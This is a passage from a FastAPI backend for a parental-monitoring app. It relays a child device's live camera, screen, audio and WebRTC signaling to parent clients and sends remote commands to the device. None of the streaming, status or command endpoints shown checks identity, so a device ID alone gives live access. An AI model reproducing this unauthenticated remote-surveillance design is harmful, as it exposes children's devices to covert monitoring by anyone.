    await ws_manager.connect("camera", device_id, websocket, role)
    try:
        while True:
            if role == "child":
                data = await websocket.receive_bytes()
                await ws_manager.relay_to_parents("camera", device_id, data)
            else:
                # Parent camera switch command bhej sakta hai (front/back)
                msg = await websocket.receive_text()
                await ws_manager.relay_to_child("camera", device_id, msg)
    except WebSocketDisconnect:
        ws_manager.disconnect("camera", device_id, websocket, role)
    except Exception as e:
        print(f"Camera WS error [{device_id[:8]}]: {e}")
        ws_manager.disconnect("camera", device_id, websocket, role)

# ─── WebSocket: WebRTC Signaling ────────────────────────────────────
@app.websocket("/ws/signal/{device_id}")
async def ws_signal(websocket: WebSocket, device_id: str, role: str = "child"):
    """
    WebRTC Signaling WebSocket.
    Offer/Answer/ICE candidates exchange ke liye.

    Message format (JSON):
      {"type": "offer",     "sdp": "..."}
      {"type": "answer",    "sdp": "..."}
      {"type": "ice",       "candidate": {...}}
      {"type": "start",     "stream": "screen|audio|camera"}
      {"type": "stop",      "stream": "screen|audio|camera"}

    Flutter mein use karo:
      final channel = WebSocketChannel.connect(
        Uri.parse('wss://appima.onrender.com/ws/signal/$deviceId?role=child')
      );
      channel.sink.add(jsonEncode({"type": "offer", "sdp": sdpString}));
    """
    await ws_manager.connect("signal", device_id, websocket, role)
    try:
        while True:
            msg = await websocket.receive_text()
            if role == "child":
                # Child ka offer/ICE → parent ko bhejo
                await ws_manager.relay_to_parents("signal", device_id, msg)
            else:
                # Parent ka answer/ICE → child ko bhejo
                await ws_manager.relay_to_child("signal", device_id, msg)
    except WebSocketDisconnect:
        ws_manager.disconnect("signal", device_id, websocket, role)
    except Exception as e:
        print(f"Signal WS error [{device_id[:8]}]: {e}")
        ws_manager.disconnect("signal", device_id, websocket, role)

# ─── REST: TURN Credentials (Metered.ca) ────────────────────────────
@app.get("/api/turn/credentials")
async def get_turn_credentials():
    """
    Metered.ca TURN server credentials fetch karo.
    Flutter/Browser mein WebRTC ke liye use karo.
    API key server pe safe rehti hai — client ko expose nahi hoti.

    Response:
    {
      "iceServers": [
        {"urls": "stun:imatoy.metered.live:80"},
        {"urls": "turn:imatoy.metered.live:80", "username": "...", "credential": "..."},
        ...
      ]
    }
    """
    try:
        async with httpx.AsyncClient() as client:
            r = await client.get(
                f"https://{METERED_DOMAIN}/api/v1/turn/credentials",
                params={"apiKey": METERED_API_KEY},
                timeout=10
            )
            ice_servers = r.json()
            return ok(data={"iceServers": ice_servers})
    except Exception as e:
        # Fallback: Google STUN server
        return ok(data={
            "iceServers": [
                {"urls": "stun:stun.l.google.com:19302"},
                {"urls": "stun:stun1.l.google.com:19302"},
            ]
        }, warning=str(e))

# ─── REST: WebSocket Status ──────────────────────────────────────────
@app.get("/api/ws/status/{device_id}")
async def ws_status(device_id: str):
    """Check karo ki device ka WebSocket connected hai ya nahi"""
    return ok(data={
        "deviceId": device_id,
        "screen":  ws_manager.get_status("screen",  device_id),
        "audio":   ws_manager.get_status("audio",   device_id),
        "camera":  ws_manager.get_status("camera",  device_id),
        "signal":  ws_manager.get_status("signal",  device_id),
    })

# ─── REST: Send Command via WebSocket ───────────────────────────────
@app.post("/api/ws/command/{device_id}")
async def ws_send_command(device_id: str, request: Request):
    """
    Parent dashboard se child ko WebSocket command bhejo.
    Body: {"stream": "screen|audio|camera", "command": "start|stop|switch_camera"}
    """
    body = await request.json()
    stream  = body.get("stream", "screen")
    command = body.get("command", "start")
    msg = json.dumps({"command": command, **{k: v for k, v in body.items() if k not in ["stream", "command"]}})
    await ws_manager.relay_to_child(stream, device_id, msg)
    return ok(message=f"Command '{command}' sent to device via {stream} WebSocket")

# ═══════════════════════════════════════════════════════════════════
# SERVE UPLOADED FILES
# ═══════════════════════════════════════════════════════════════════
@app.get("/uploads/{category}/{filename}")
async def serve_file(category: str, filename: str):
    allowed = ["media", "screenshots", "audio", "recordings"]
    if category not in allowed:
        raise HTTPException(status_code=400, detail="Invalid category")
    fpath = f"{UPLOAD_DIR}/{category}/{filename}"
    if not os.path.exists(fpath):
        raise HTTPException(status_code=404, detail="File not found")
    return FileResponse(fpath)

# ═══════════════════════════════════════════════════════════════════
# EXCEPTION HANDLERS
# ═══════════════════════════════════════════════════════════════════
@app.exception_handler(HTTPException)
async def http_exception_handler(request: Request, exc: HTTPException):
    detail = exc.detail
    if isinstance(detail, dict):
        return JSONResponse(status_code=exc.status_code, content=detail)
    return JSONResponse(status_code=exc.status_code, content={"success": False, "message": str(detail)})

@app.exception_handler(Exception)
async def general_exception_handler(request: Request, exc: Exception):
    return JSONResponse(status_code=500, content={"success": False, "message": str(exc)})

# ═══════════════════════════════════════════════════════════════════
# MAIN ENTRY POINT
# ═══════════════════════════════════════════════════════════════════
if __name__ == "__main__":
    import sys
    if hasattr(sys.stdout, "reconfigure"):
        sys.stdout.reconfigure(encoding="utf-8")
    print("=" * 55)
    print("  IMATOY Backend Server (Python/FastAPI + Supabase)")
    print(f"  Port    : {PORT}")
    print(f"  Supabase: {SUPABASE_URL}")
    print("=" * 55)
    uvicorn.run(app, host="0.0.0.0", port=PORT, log_level="info")
